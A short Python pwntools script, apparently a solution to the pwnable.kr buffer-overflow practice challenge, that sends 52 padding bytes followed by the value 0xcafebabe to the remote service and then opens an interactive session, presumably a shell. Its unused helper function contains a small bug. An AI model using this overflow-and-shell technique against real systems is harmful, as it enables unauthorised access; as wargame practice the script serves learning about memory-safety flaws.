from pwn import *
def slog(name, addr):
	return success(": ".join(name, hex(addr)))

p = remote("pwnable.kr", 9000)

key = 0xcafebabe
buf = b"A" * 52 + p32(key)

p.sendline(buf)

p.interactive()
